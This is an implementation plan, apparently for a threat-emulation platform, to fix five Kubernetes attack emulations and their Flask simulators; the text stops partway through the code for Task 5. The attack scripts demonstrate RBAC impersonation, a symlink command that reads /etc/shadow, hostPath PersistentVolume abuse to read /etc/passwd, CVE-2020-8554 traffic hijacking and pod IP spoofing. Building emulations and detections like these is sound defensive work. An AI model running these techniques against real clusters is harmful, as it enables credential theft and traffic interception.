# K8s Emulation Fixes Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Fix all five k8s emulations by correcting metadata fields, adding startup health checks, completing incomplete attack chains, and adding detection rule files.

**Architecture:** Each emulation is a self-contained directory under `step1/emulations/k8s_*/` with a `MANIFEST.py`, an `attack.py`, an `infra/__main__.py` (Pulumi/Flask simulator on EC2), and a `detections/` subdirectory. Attack chain completions extend the embedded Flask app in `infra/__main__.py` and add new print-phases to `attack.py`. Detection files are standalone YAML/KQL files with no code dependencies.

**Tech Stack:** Python 3, Flask (embedded in EC2 user_data), Pulumi AWS, Sigma rule YAML, KQL (Kubernetes audit log variant)

## Global Constraints

- Never modify `registry.py` — emulations are auto-discovered
- All Flask endpoints in `infra/__main__.py` are embedded inside the `user_data` heredoc string — keep Python indentation correct inside that string
- `attack.py` must expose `run(outputs: dict, region: str = "us-east-1") -> None`
- Detection Sigma: `logsource.product: kubernetes`, `logsource.service: audit`
- Detection KQL: use `KubernetesAuditLogs` table with `| extend log = parse_json(AuditLog)` pattern (matches what SIEM ingestion produces from K8s audit JSON)
- All `detections/` filenames lowercase: `sigma_t<id>.yml` and `kql_t<id>.kql`
- Tasks 1–2 are sequential prerequisites; Tasks 3–5 and Tasks 6–10 are fully independent and can be parallelized

---

### Task 1: Fix MANIFEST metadata (technique_count, phase_count, T1611 mapping)

**Files:**
- Modify: `emulations/k8s_rbac_impersonation/MANIFEST.py`
- Modify: `emulations/k8s_writable_log_escape/MANIFEST.py`
- Modify: `emulations/k8s_pvc_psa_bypass/MANIFEST.py`

**Convention confirmed:** `technique_count == len(mitre_mappings)`.

- [ ] **Step 1: Fix k8s_rbac_impersonation — technique_count 1 → 2**

In `emulations/k8s_rbac_impersonation/MANIFEST.py`, change:
```python
    "technique_count": 1,
```
to:
```python
    "technique_count": 2,
```

- [ ] **Step 2: Fix k8s_writable_log_escape — technique_count 1 → 2**

In `emulations/k8s_writable_log_escape/MANIFEST.py`, change:
```python
    "technique_count": 1,
```
to:
```python
    "technique_count": 2,
```

- [ ] **Step 3: Fix k8s_pvc_psa_bypass — phase_count, technique_count, attack_path, and add T1611**

Replace the entire `k8s_pvc_psa_bypass/MANIFEST.py` content:

```python
"""MANIFEST for k8s_pvc_psa_bypass."""
MANIFEST = {
    "schema_version": 2,
    "name": "k8s_pvc_psa_bypass",
    "display_name": "K8s PSA Bypass via PV Abuse",
    "description": (
        "Demonstrates how an attacker bypasses baseline Pod Security Admission (PSA) "
        "by mounting host-paths using raw PersistentVolume and Claims, then reads "
        "sensitive host files from inside an otherwise unprivileged pod."
    ),
    "tier": "enterprise",
    "platform": "k8s",
    "added": "2026-06",
    "origin": "unknown",
    "origin_label": "K8S EMULATION",
    "tags": ["Kubernetes", "Pod Security Admission", "Bypass", "PersistentVolume", "Host Escape"],
    "technique_count": 2,
    "severity": "HIGH",
    "aliases": "PV Abuse Bypass",
    "attribution": "Various cloud exploitation frameworks",
    "active_since": "2022",
    "targets": "K8s clusters relying solely on PSA baseline configurations without storage admission restrictions",
    "incidents": ["Generic cloud infrastructure compromise"],
    "attack_path": [
        {
            "phase": 1,
            "name": "PSA Bypass via HostPath PV",
            "techniques": [{"id": "T1211", "name": "Exploitation for Defense Evasion"}],
        },
        {
            "phase": 2,
            "name": "Host Filesystem Read from Pod",
            "techniques": [{"id": "T1611", "name": "Escape to Host"}],
        }
    ],
    "mitre_mappings": [
        {
            "id": "T1211",
            "name": "Exploitation for Defense Evasion",
            "tactic": "Defense Evasion",
            "platform": "Kubernetes",
            "description": "Circumventing container file restrictions by creating hostPath-backed PVs that PSA does not inspect."
        },
        {
            "id": "T1611",
            "name": "Escape to Host",
            "tactic": "Privilege Escalation",
            "platform": "Kubernetes",
            "description": "Mounting the hostPath PV inside a pod to read sensitive host files (e.g. /etc/passwd) from an otherwise unprivileged container."
        }
    ],
    "references": [
        {"icon": "#", "title": "Bypassing PSA via Storage", "source": "Kubernetes Docs", "type": "DOCUMENTATION", "color": "purple"}
    ],
    "phase_count": 2,
    "estimated_duration_minutes": 10,
    "estimated_cost_per_hour_usd": 0.015,
    "default_ttl_hours": 2,
    "total_resources": 6,
    "resources": {
        "ec2_count": 1,
        "instance_types": ["t3.micro"],
        "uses_lambda": False,
        "uses_secrets_manager": False,
        "uses_cloudtrail": False,
        "uses_guardduty": False,
    },
    "resource_costs": [
        {"name": "EC2 Host", "count": 1, "cost_per_hour_usd": 0.015}
    ]
}
```

- [ ] **Step 4: Commit**

```bash
git add emulations/k8s_rbac_impersonation/MANIFEST.py emulations/k8s_writable_log_escape/MANIFEST.py emulations/k8s_pvc_psa_bypass/MANIFEST.py
git commit -m "fix: correct technique_count and phase metadata in k8s MANIFESTs"
```

---

### Task 2: Add startup health-check polling to all 5 attack.py files

**Files:**
- Modify: `emulations/k8s_rbac_impersonation/attack.py`
- Modify: `emulations/k8s_writable_log_escape/attack.py`
- Modify: `emulations/k8s_pvc_psa_bypass/attack.py`
- Modify: `emulations/k8s_external_ips_mitm/attack.py`
- Modify: `emulations/k8s_pod_status_mitm/attack.py`

**Why:** EC2 user_data installs Docker, builds a container image, then starts it. This takes 3–5 minutes after Pulumi returns the IP. Without a health check, the first `run()` call fails with `ConnectionRefusedError`.

Each attack.py gets a `_wait_for_simulator(url)` helper added at the top, and a call to it at the start of `run()`.

- [ ] **Step 1: Update k8s_rbac_impersonation/attack.py**

Replace file content:
```python
import time
import requests
import json

def _wait_for_simulator(url: str, timeout: int = 300) -> None:
    print("[*] Waiting for simulator to become ready...")
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            requests.get(f"{url}/health", timeout=3)
            print("[+] Simulator is ready.")
            return
        except Exception:
            time.sleep(10)
    raise RuntimeError(f"Simulator at {url} did not become ready within {timeout}s")

def run(outputs: dict, region: str = "us-east-1") -> None:
    ip = outputs.get("vuln_instance_ip")
    if not ip:
        raise RuntimeError("Missing vuln_instance_ip stack output.")

    url = f"http://{ip}:8080"
    _wait_for_simulator(url)

    headers = {"Authorization": "Bearer stolen-dev-token"}

    print("[*] Phase 1: Self Subject Rules Review (Permission Enumeration)")
    try:
        resp = requests.post(f"{url}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", headers=headers, timeout=10)
        if resp.status_code == 200:
            print("[+] Successfully queried SelfSubjectRulesReviews!")
            print(f"[+] Permissions returned: {resp.json().get('status', {}).get('resourceRules')}")
        else:
            print(f"[-] SSRR failed with status code {resp.status_code}")
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return

    print("[*] Phase 2: Attempting Privilege Escalation via Impersonation")
    imp_headers = {
        **headers,
        "Impersonate-User": "admin-sa",
        "Impersonate-Group": "system:masters"
    }

    try:
        resp = requests.get(f"{url}/api/v1/secrets", headers=imp_headers, timeout=10)
        if resp.status_code == 200:
            print("[+] Privilege Escalation Successful!")
            print(f"[+] Retrieved Secret: {resp.json()}")
        else:
            print(f"[-] Impersonation failed with status code {resp.status_code}")
    except Exception as e:
        print(f"[-] Impersonation request failed: {e}")
```

- [ ] **Step 2: Update k8s_writable_log_escape/attack.py**

Replace file content:
```python
import time
import requests

def _wait_for_simulator(url: str, timeout: int = 300) -> None:
    print("[*] Waiting for simulator to become ready...")
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            requests.get(f"{url}/health", timeout=3)
            print("[+] Simulator is ready.")
            return
        except Exception:
            time.sleep(10)
    raise RuntimeError(f"Simulator at {url} did not become ready within {timeout}s")

def run(outputs: dict, region: str = "us-east-1") -> None:
    ip = outputs.get("vuln_instance_ip")
    if not ip:
        raise RuntimeError("Missing vuln_instance_ip stack output.")

    url = f"http://{ip}:8080"
    _wait_for_simulator(url)

    print("[*] Phase 1: Creating symlink inside the writable mount /var/log")
    log_path = "/var/log/pods/webapp.log"
    target_file = "/etc/shadow"
    cmd_payload = f"ln -s {target_file} {log_path}"

    try:
        resp = requests.post(f"{url}/cmd", data={"cmd": cmd_payload}, timeout=10)
        print(f"[+] Pod output: {resp.text.strip()}")
    except Exception as e:
        print(f"[-] Execution failed: {e}")
        return

    print("[*] Phase 2: Fetching Node logs via Kubelet/API proxy subresource")
    try:
        resp = requests.get(f"{url}/api/v1/nodes/worker-1/proxy/logs", params={"path": log_path}, timeout=10)
        if resp.status_code == 200:
            print("[+] Host escape successful! Read contents of /etc/shadow:")
            print(resp.text)
        else:
            print(f"[-] Log fetch failed with status code {resp.status_code}")
    except Exception as e:
        print(f"[-] Log fetch request failed: {e}")
```

- [ ] **Step 3: Update k8s_external_ips_mitm/attack.py**

Replace file content (full content shown in Task 4 after attack chain is extended; add health check now):
```python
import time
import requests

def _wait_for_simulator(url: str, timeout: int = 300) -> None:
    print("[*] Waiting for simulator to become ready...")
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            requests.get(f"{url}/health", timeout=3)
            print("[+] Simulator is ready.")
            return
        except Exception:
            time.sleep(10)
    raise RuntimeError(f"Simulator at {url} did not become ready within {timeout}s")

def run(outputs: dict, region: str = "us-east-1") -> None:
    ip = outputs.get("vuln_instance_ip")
    if not ip:
        raise RuntimeError("Missing vuln_instance_ip stack output.")

    url = f"http://{ip}:8080"
    _wait_for_simulator(url)

    print("[*] Phase 1: Intercepting Traffic via CVE-2020-8554 External IPs Service")
    service_spec = {
        "apiVersion": "v1",
        "kind": "Service",
        "metadata": {"name": "mitm-service"},
        "spec": {
            "selector": {"app": "attacker-pod"},
            "ports": [{"port": 80, "targetPort": 8080}],
            "externalIPs": ["8.8.8.8"]
        }
    }

    try:
        resp = requests.post(f"{url}/api/v1/namespaces/default/services", json=service_spec, timeout=10)
        if resp.status_code == 201:
            print("[+] External IPs hijack service deployed successfully!")
            print(f"[+] Hijacked route info: {resp.json()}")
        else:
            print(f"[-] Service creation failed with status code {resp.status_code}")
            return
    except Exception as e:
        print(f"[-] Request failed: {e}")
        return

    print("[*] Phase 2: Simulating victim pod traffic to 8.8.8.8 (intercepted by attacker)")
    try:
        resp = requests.post(f"{url}/simulate/victim-traffic", json={"destination": "8.8.8.8", "payload": "DNS query: example.com"}, timeout=10)
        if resp.status_code == 200:
            result = resp.json()
            print(f"[+] Traffic interception confirmed!")
            print(f"[+] Victim sent to: {result.get('intended_destination')}")
            print(f"[+] Traffic received by: {result.get('actual_receiver')} (attacker-pod)")
            print(f"[+] Intercepted payload: {result.get('intercepted_payload')}")
        else:
            print(f"[-] Traffic simulation failed: {resp.status_code}")
    except Exception as e:
        print(f"[-] Traffic simulation request failed: {e}")
```

- [ ] **Step 4: Update k8s_pod_status_mitm/attack.py**

Replace file content (full content shown in Task 5 after attack chain extended; add health check now):
```python
import time
import requests

def _wait_for_simulator(url: str, timeout: int = 300) -> None:
    print("[*] Waiting for simulator to become ready...")
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            requests.get(f"{url}/health", timeout=3)
            print("[+] Simulator is ready.")
            return
        except Exception:
            time.sleep(10)
    raise RuntimeError(f"Simulator at {url} did not become ready within {timeout}s")

def run(outputs: dict, region: str = "us-east-1") -> None:
    ip = outputs.get("vuln_instance_ip")
    if not ip:
        raise RuntimeError("Missing vuln_instance_ip stack output.")

    url = f"http://{ip}:8080"
    _wait_for_simulator(url)

    print("[*] Phase 1: Spoofing Pod IP via status.podIP Patch request")
    status_patch = {
        "status": {
            "podIP": "10.244.9.99"
        }
    }

    try:
        headers = {"Content-Type": "application/strategic-merge-patch+json"}
        resp = requests.patch(
            f"{url}/api/v1/namespaces/default/pods/victim-pod/status",
            json=status_patch,
            headers=headers,
            timeout=10
        )
        if resp.status_code == 200:
            print("[+] Pod IP spoofed successfully!")
            print(f"[+] Hijacked status config: {resp.json()}")
        else:
            print(f"[-] Status patch failed with status code {resp.status_code}")
            return
    except Exception as e:
        print(f"[-] Request failed: {e}")
        return

    print("[*] Phase 2: Verifying service traffic now routes to attacker-controlled IP")
    try:
        resp = requests.post(
            f"{url}/simulate/service-traffic",
            json={"service": "victim-svc", "client_payload": "GET /api/data HTTP/1.1"},
            timeout=10
        )
        if resp.status_code == 200:
            result = resp.json()
            print(f"[+] Traffic redirect confirmed!")
            print(f"[+] Service 'victim-svc' now routes to: {result.get('routed_to_ip')}")
            print(f"[+] Attacker IP is: {result.get('attacker_ip')}")
            print(f"[+] Client payload intercepted: {result.get('intercepted_payload')}")
        else:
            print(f"[-] Traffic simulation failed: {resp.status_code}")
    except Exception as e:
        print(f"[-] Traffic simulation request failed: {e}")
```

- [ ] **Step 5: Update k8s_pvc_psa_bypass/attack.py** (also extends chain — final content for this file)

Replace file content:
```python
import time
import requests

def _wait_for_simulator(url: str, timeout: int = 300) -> None:
    print("[*] Waiting for simulator to become ready...")
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            requests.get(f"{url}/health", timeout=3)
            print("[+] Simulator is ready.")
            return
        except Exception:
            time.sleep(10)
    raise RuntimeError(f"Simulator at {url} did not become ready within {timeout}s")

def run(outputs: dict, region: str = "us-east-1") -> None:
    ip = outputs.get("vuln_instance_ip")
    if not ip:
        raise RuntimeError("Missing vuln_instance_ip stack output.")

    url = f"http://{ip}:8080"
    _wait_for_simulator(url)

    print("[*] Phase 1: Creating HostPath-backed PersistentVolume (PSA Bypass)")
    pv_spec = {
        "apiVersion": "v1",
        "kind": "PersistentVolume",
        "metadata": {"name": "bypass-pv"},
        "spec": {
            "capacity": {"storage": "1Gi"},
            "accessModes": ["ReadWriteOnce"],
            "hostPath": {"path": "/etc"}
        }
    }

    try:
        resp = requests.post(f"{url}/api/v1/persistentvolumes", json=pv_spec, timeout=10)
        if resp.status_code == 201:
            print("[+] PersistentVolume created successfully!")
            print(f"[+] PV metadata: {resp.json()}")
        else:
            print(f"[-] PV creation failed: {resp.status_code}")
            return
    except Exception as e:
        print(f"[-] PV request failed: {e}")
        return

    print("[*] Phase 2: Creating PersistentVolumeClaim to mount host storage")
    pvc_spec = {
        "apiVersion": "v1",
        "kind": "PersistentVolumeClaim",
        "metadata": {"name": "bypass-pvc"},
        "spec": {
            "accessModes": ["ReadWriteOnce"],
            "resources": {"requests": {"storage": "1Gi"}},
            "volumeName": "bypass-pv"
        }
    }

    try:
        resp = requests.post(f"{url}/api/v1/namespaces/default/persistentvolumeclaims", json=pvc_spec, timeout=10)
        if resp.status_code == 201:
            print("[+] PersistentVolumeClaim created and bound!")
            print(f"[+] PVC metadata: {resp.json()}")
        else:
            print(f"[-] PVC creation failed: {resp.status_code}")
            return
    except Exception as e:
        print(f"[-] PVC request failed: {e}")
        return

    print("[*] Phase 3: Creating pod that mounts PVC and reading host /etc/passwd")
    pod_spec = {
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {"name": "bypass-pod"},
        "spec": {
            "containers": [{"name": "attacker", "image": "alpine", "command": ["cat", "/mnt/host/passwd"]}],
            "volumes": [{"name": "host-vol", "persistentVolumeClaim": {"claimName": "bypass-pvc"}}]
        }
    }

    try:
        resp = requests.post(f"{url}/api/v1/namespaces/default/pods", json=pod_spec, timeout=10)
        if resp.status_code == 201:
            print("[+] Pod scheduled with PVC mount!")
        else:
            print(f"[-] Pod creation failed: {resp.status_code}")
            return
    except Exception as e:
        print(f"[-] Pod creation request failed: {e}")
        return

    try:
        resp = requests.post(f"{url}/pod-exec", json={"pod": "bypass-pod", "cmd": "cat /mnt/host/passwd"}, timeout=10)
        if resp.status_code == 200:
            result = resp.json()
            print("[+] Host escape via PVC successful! Contents of host /etc/passwd:")
            print(result.get("output", ""))
        else:
            print(f"[-] Pod exec failed: {resp.status_code}")
    except Exception as e:
        print(f"[-] Pod exec request failed: {e}")
```

- [ ] **Step 6: Commit**

```bash
git add emulations/k8s_rbac_impersonation/attack.py emulations/k8s_writable_log_escape/attack.py emulations/k8s_pvc_psa_bypass/attack.py emulations/k8s_external_ips_mitm/attack.py emulations/k8s_pod_status_mitm/attack.py
git commit -m "fix: add startup health-check polling and extend attack chains in k8s attack.py files"
```

---

### Task 3: Complete k8s_pvc_psa_bypass attack chain in infra

**Files:**
- Modify: `emulations/k8s_pvc_psa_bypass/infra/__main__.py`

Add three new Flask endpoints to the embedded app:
1. `POST /api/v1/namespaces/default/persistentvolumeclaims` — accepts PVC spec (namespaced version of the existing endpoint)
2. `POST /api/v1/namespaces/default/pods` — creates a pod record referencing the PVC
3. `POST /pod-exec` — simulates exec into a pod that has the PVC mounted; returns the simulated host file contents

- [ ] **Step 1: Replace emulations/k8s_pvc_psa_bypass/infra/__main__.py**

```python
import pulumi
import pulumi_aws as aws

stack_name = pulumi.get_stack()
region = aws.config.region or "ap-south-1"

TAGS = {"MayaTrail": "true", "ThreatActor": "K8S_PSA_BYPASS"}

vpc = aws.ec2.Vpc(f"mayatrail-k8s-pvc-vpc-{stack_name}", cidr_block="10.130.0.0/16", enable_dns_hostnames=True, enable_dns_support=True, tags=TAGS)
igw = aws.ec2.InternetGateway(f"mayatrail-k8s-pvc-igw-{stack_name}", vpc_id=vpc.id, tags=TAGS)
subnet = aws.ec2.Subnet(f"mayatrail-k8s-pvc-subnet-{stack_name}", vpc_id=vpc.id, cidr_block="10.130.1.0/24", map_public_ip_on_launch=True, availability_zone=f"{region}a", tags=TAGS)
rt = aws.ec2.RouteTable(f"mayatrail-k8s-pvc-rt-{stack_name}", vpc_id=vpc.id, routes=[aws.ec2.RouteTableRouteArgs(cidr_block="0.0.0.0/0", gateway_id=igw.id)], tags=TAGS)
aws.ec2.RouteTableAssociation(f"mayatrail-k8s-pvc-rta-{stack_name}", subnet_id=subnet.id, route_table_id=rt.id)

sg = aws.ec2.SecurityGroup(f"mayatrail-k8s-pvc-sg-{stack_name}", vpc_id=vpc.id, ingress=[
    aws.ec2.SecurityGroupIngressArgs(protocol="tcp", from_port=8080, to_port=8080, cidr_blocks=["0.0.0.0/0"])
], egress=[aws.ec2.SecurityGroupEgressArgs(protocol="-1", from_port=0, to_port=0, cidr_blocks=["0.0.0.0/0"])], tags=TAGS)

ami = aws.ec2.get_ami(most_recent=True, owners=["amazon"], filters=[aws.ec2.GetAmiFilterArgs(name="name", values=["al2023-ami-*-x86_64"])])

user_data = """#!/bin/bash
dnf install -y docker
systemctl enable --now docker
mkdir -p /opt/app
cat > /opt/app/app.py << 'PYEOF'
from flask import Flask, request, jsonify

app = Flask(__name__)

HOST_FILESYSTEM = {
    "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
    "/etc/shadow": "root:$6$vulnerable_root_hash:19500:0:99999:7:::",
    "/etc/kubernetes/admin.conf": "apiVersion: v1\\nkind: Config\\nclusters:\\n- name: minikube"
}

RESOURCES = {
    "pv": [],
    "pvc": [],
    "pods": []
}

@app.route('/health')
def health():
    return 'ok'

@app.route('/api/v1/persistentvolumes', methods=['POST'])
def create_pv():
    data = request.json or {}
    name = data.get("metadata", {}).get("name", "")
    host_path = data.get("spec", {}).get("hostPath", {}).get("path", "")
    if not name or not host_path:
        return "Bad request", 400
    pv = {"name": name, "hostPath": host_path, "status": "Available"}
    RESOURCES["pv"].append(pv)
    return jsonify({"status": "Created", "pv": pv}), 201

@app.route('/api/v1/namespaces/default/persistentvolumeclaims', methods=['POST'])
def create_pvc():
    data = request.json or {}
    name = data.get("metadata", {}).get("name", "")
    volume_name = data.get("spec", {}).get("volumeName", "")
    if not name:
        return "Bad request", 400
    bound_host_path = None
    for pv in RESOURCES["pv"]:
        if pv["name"] == volume_name or not volume_name:
            bound_host_path = pv["hostPath"]
            pv["status"] = "Bound"
            break
    pvc = {"name": name, "volumeName": volume_name, "boundHostPath": bound_host_path, "status": "Bound"}
    RESOURCES["pvc"].append(pvc)
    return jsonify({"status": "Created", "pvc": pvc}), 201

@app.route('/api/v1/namespaces/default/pods', methods=['POST'])
def create_pod():
    data = request.json or {}
    name = data.get("metadata", {}).get("name", "")
    if not name:
        return "Bad request", 400
    volumes = data.get("spec", {}).get("volumes", [])
    pvc_claim = None
    for vol in volumes:
        pvc_ref = vol.get("persistentVolumeClaim", {}).get("claimName")
        if pvc_ref:
            pvc_claim = pvc_ref
            break
    bound_host_path = None
    for pvc in RESOURCES["pvc"]:
        if pvc["name"] == pvc_claim:
            bound_host_path = pvc.get("boundHostPath")
            break
    pod = {"name": name, "pvcClaim": pvc_claim, "mountedHostPath": bound_host_path, "status": "Running"}
    RESOURCES["pods"].append(pod)
    return jsonify({"status": "Created", "pod": pod}), 201

@app.route('/pod-exec', methods=['POST'])
def pod_exec():
    data = request.json or {}
    pod_name = data.get("pod", "")
    cmd = data.get("cmd", "")
    pod = next((p for p in RESOURCES["pods"] if p["name"] == pod_name), None)
    if not pod:
        return "Pod not found", 404
    host_path = pod.get("mountedHostPath", "")
    if "passwd" in cmd and host_path == "/etc":
        output = HOST_FILESYSTEM.get("/etc/passwd", "")
        return jsonify({"pod": pod_name, "cmd": cmd, "output": output, "note": "Read from host path /etc via PVC mount"})
    if "shadow" in cmd and host_path == "/etc":
        output = HOST_FILESYSTEM.get("/etc/shadow", "")
        return jsonify({"pod": pod_name, "cmd": cmd, "output": output, "note": "Read from host path /etc via PVC mount"})
    return jsonify({"pod": pod_name, "cmd": cmd, "output": "command executed", "mountedHostPath": host_path})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
PYEOF

cat > /opt/app/Dockerfile << 'DKEOF'
FROM python:3.9-slim
RUN pip install flask
COPY app.py /app/app.py
CMD ["python", "/app/app.py"]
DKEOF

cd /opt/app
docker build -t k8s-pvc .
docker run -d --name k8s-pvc -p 8080:8080 --restart unless-stopped k8s-pvc
"""

instance = aws.ec2.Instance(f"mayatrail-k8s-pvc-ec2-{stack_name}", instance_type="t3.micro", ami=ami.id, subnet_id=subnet.id, vpc_security_group_ids=[sg.id], user_data=user_data, tags=TAGS)

pulumi.export("vuln_instance_ip", instance.public_ip)
```

- [ ] **Step 2: Commit**

```bash
git add emulations/k8s_pvc_psa_bypass/infra/__main__.py
git commit -m "feat: complete k8s_pvc_psa_bypass attack chain with pod creation and host file read phase"
```

---

### Task 4: Complete k8s_external_ips_mitm attack chain in infra

**Files:**
- Modify: `emulations/k8s_external_ips_mitm/infra/__main__.py`

Add:
1. Change endpoint from `/api/v1/services` to `/api/v1/namespaces/default/services` (correct K8s path)
2. `POST /simulate/victim-traffic` — simulates a victim pod sending traffic to a hijacked IP; the response shows it was received by the attacker service

- [ ] **Step 1: Replace emulations/k8s_external_ips_mitm/infra/__main__.py**

```python
import pulumi
import pulumi_aws as aws

stack_name = pulumi.get_stack()
region = aws.config.region or "ap-south-1"

TAGS = {"MayaTrail": "true", "ThreatActor": "K8S_MITM_CVE"}

vpc = aws.ec2.Vpc(f"mayatrail-k8s-mitm-vpc-{stack_name}", cidr_block="10.140.0.0/16", enable_dns_hostnames=True, enable_dns_support=True, tags=TAGS)
igw = aws.ec2.InternetGateway(f"mayatrail-k8s-mitm-igw-{stack_name}", vpc_id=vpc.id, tags=TAGS)
subnet = aws.ec2.Subnet(f"mayatrail-k8s-mitm-subnet-{stack_name}", vpc_id=vpc.id, cidr_block="10.140.1.0/24", map_public_ip_on_launch=True, availability_zone=f"{region}a", tags=TAGS)
rt = aws.ec2.RouteTable(f"mayatrail-k8s-mitm-rt-{stack_name}", vpc_id=vpc.id, routes=[aws.ec2.RouteTableRouteArgs(cidr_block="0.0.0.0/0", gateway_id=igw.id)], tags=TAGS)
aws.ec2.RouteTableAssociation(f"mayatrail-k8s-mitm-rta-{stack_name}", subnet_id=subnet.id, route_table_id=rt.id)

sg = aws.ec2.SecurityGroup(f"mayatrail-k8s-mitm-sg-{stack_name}", vpc_id=vpc.id, ingress=[
    aws.ec2.SecurityGroupIngressArgs(protocol="tcp", from_port=8080, to_port=8080, cidr_blocks=["0.0.0.0/0"])
], egress=[aws.ec2.SecurityGroupEgressArgs(protocol="-1", from_port=0, to_port=0, cidr_blocks=["0.0.0.0/0"])], tags=TAGS)

ami = aws.ec2.get_ami(most_recent=True, owners=["amazon"], filters=[aws.ec2.GetAmiFilterArgs(name="name", values=["al2023-ami-*-x86_64"])])

user_data = """#!/bin/bash
dnf install -y docker
systemctl enable --now docker
mkdir -p /opt/app
cat > /opt/app/app.py << 'PYEOF'
from flask import Flask, request, jsonify

app = Flask(__name__)

RESOURCES = {
    "services": []
}

@app.route('/health')
def health():
    return 'ok'

@app.route('/api/v1/namespaces/default/services', methods=['POST'])
def create_service():
    data = request.json or {}
    name = data.get("metadata", {}).get("name", "")
    external_ips = data.get("spec", {}).get("externalIPs", [])
    selector = data.get("spec", {}).get("selector", {})
    if not name or not external_ips:
        return "Bad request", 400
    service = {"name": name, "externalIPs": external_ips, "selector": selector}
    RESOURCES["services"].append(service)
    return jsonify({"status": "Created", "service": service}), 201

@app.route('/simulate/victim-traffic', methods=['POST'])
def simulate_victim_traffic():
    data = request.json or {}
    destination = data.get("destination", "")
    payload = data.get("payload", "")
    hijacked_service = next(
        (s for s in RESOURCES["services"] if destination in s.get("externalIPs", [])),
        None
    )
    if not hijacked_service:
        return jsonify({"note": "No hijack active for this destination", "destination": destination}), 200
    return jsonify({
        "intended_destination": destination,
        "actual_receiver": hijacked_service["selector"].get("app", "attacker-pod"),
        "intercepted_payload": payload,
        "hijacking_service": hijacked_service["name"],
        "note": "kube-proxy redirected traffic via externalIPs rule (CVE-2020-8554)"
    }), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
PYEOF

cat > /opt/app/Dockerfile << 'DKEOF'
FROM python:3.9-slim
RUN pip install flask
COPY app.py /app/app.py
CMD ["python", "/app/app.py"]
DKEOF

cd /opt/app
docker build -t k8s-mitm .
docker run -d --name k8s-mitm -p 8080:8080 --restart unless-stopped k8s-mitm
"""

instance = aws.ec2.Instance(f"mayatrail-k8s-mitm-ec2-{stack_name}", instance_type="t3.micro", ami=ami.id, subnet_id=subnet.id, vpc_security_group_ids=[sg.id], user_data=user_data, tags=TAGS)

pulumi.export("vuln_instance_ip", instance.public_ip)
```

- [ ] **Step 2: Commit**

```bash
git add emulations/k8s_external_ips_mitm/infra/__main__.py
git commit -m "feat: complete k8s_external_ips_mitm attack chain with traffic interception simulation"
```

---

### Task 5: Complete k8s_pod_status_mitm attack chain in infra

**Files:**
- Modify: `emulations/k8s_pod_status_mitm/infra/__main__.py`

Add `POST /simulate/service-traffic` that routes to the pod by current `podIP` and shows redirection to the attacker IP after the patch.

- [ ] **Step 1: Replace emulations/k8s_pod_status_mitm/infra/__main__.py**

```python
import pulumi
import pulumi_aws as aws

stack_name = pulumi.get_stack()
region = aws.config.region or "ap-south-1"

TAGS = {"MayaTrail": "true", "ThreatActor": "K8S_STATUS_MITM"}

vpc = aws.ec2.Vpc(f"mayatrail-k8s-stat-vpc-{stack_name}", cidr_block="10.150.0.0/16", enable_dns_hostnames=True, enable_dns_support=True, tags=TAGS)
igw = aws.ec2.InternetGateway(f"mayatrail-k8s-stat-igw-{stack_name}", vpc_id=vpc.id, tags=TAGS)
subnet = aws.ec2.Subnet(f"mayatrail-k8s-stat-subnet-{stack_name}", vpc_id=vpc.id, cidr_block="10.150.1.0/24", map_public_ip_on_launch=True, availability_zone=f"{region}a", tags=TAGS)
rt = aws.ec2.RouteTable(f"mayatrail-k8s-stat-rt-{stack_name}", vpc_id=vpc.id, routes=[aws.ec2.RouteTableRouteArgs(cidr_block="0.0.0.0/0", gateway_id=igw.id)], tags=TAGS)
aws.ec2.RouteTableAssociation(f"mayatrail-k8s-stat-rta-{stack_name}", subnet_id=subnet.id, route_table_id=rt.id)

sg = aws.ec2.SecurityGroup(f"mayatrail-k8s-stat-sg-{stack_name}", vpc_id=vpc.id, ingress=[
    aws.ec2.SecurityGroupIngressArgs(protocol="tcp", from_port=8080, to_port=8080, cidr_blocks=["0.0.0.0/0"])
], egress=[aws.ec2.SecurityGroupEgressArgs(protocol="-1", from_port=0, to_port=0, cidr_blocks=["0.0.0.0/0"])], tags=TAGS)

ami = aws.ec2.get_ami(most_recent=True, owners=["amazon"], filters=[aws.ec2.GetAmiFilterArgs(name="name", values=["al2023-ami-*-x86_64"])])

user_data = """#!/bin/bash
dnf install -y docker
systemctl enable --now docker
mkdir -p /opt/app
cat > /opt/app/app.py << 'PYEOF'
from flask import Flask, request, jsonify

app = Flask(__name__)

ATTACKER_IP = "10.244.9.99"

RESOURCES = {
    "pod_status": {
        "name": "victim-pod",
        "podIP": "10.244.1.20",
        "podIPs": [{"ip": "10.244.1.20"}]
    }
}

@app.route('/health')
def health():
    return 'ok'

@app.route('/api/v1/namespaces/default/pods/victim-pod/status', methods=['PATCH'])
def patch_status():
    data = request.json or {}
    new_ip = data.get("status", {}).get("podIP")
    if not new_ip:
        return "Bad request: missing status.podIP", 400
    RESOURCES["pod_status"]["podIP"] = new_ip
    RESOURCES["pod_status"]["podIPs"] = [{"ip": new_ip}]
    return jsonify({
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {"name": "victim-pod", "namespace": "default"},
        "status": RESOURCES["pod_status"]
    })

@app.route('/simulate/service-traffic', methods=['POST'])
def simulate_service_traffic():
    data = request.json or {}
    service = data.get("service", "victim-svc")
    payload = data.get("client_payload", "")
    current_pod_ip = RESOURCES["pod_status"]["podIP"]
    intercepted = (current_pod_ip == ATTACKER_IP)
    return jsonify({
        "service": service,
        "routed_to_ip": current_pod_ip,
        "attacker_ip": ATTACKER_IP,
        "intercepted": intercepted,
        "intercepted_payload": payload if intercepted else None,
        "note": (
            "Traffic hijacked: endpoint now points to attacker-controlled IP"
            if intercepted else
